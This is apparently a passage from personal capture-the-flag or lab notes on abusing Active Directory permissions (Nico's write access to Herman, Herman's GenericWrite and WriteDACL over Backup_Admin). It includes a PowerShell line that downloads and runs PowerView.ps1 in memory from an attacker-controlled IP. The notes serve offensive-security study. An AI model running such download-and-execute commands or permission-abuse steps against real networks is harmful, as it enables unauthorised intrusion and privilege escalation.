
Now we know that Nico has write access to Herman.

Herman is having genric write and WriteDACL to Backup_Admin
![[Pasted image 20240514035852.png]]

If we search write owner in AD security (i.e. Scanning for Active Directory Privileges & Privileged Accounts) https://adsecurity.org/?p=3658

![[Pasted image 20240514040331.png]]

![[Pasted image 20240514040453.png]]

So in order to exploit this we have to load Power Viewer.
```
IEX (New-Object Net.Webclient).downloadstring("http://10.10.16.20:80/PowerView.ps1")
```

Now the very 1st step is to take ownership from Herman to Nico




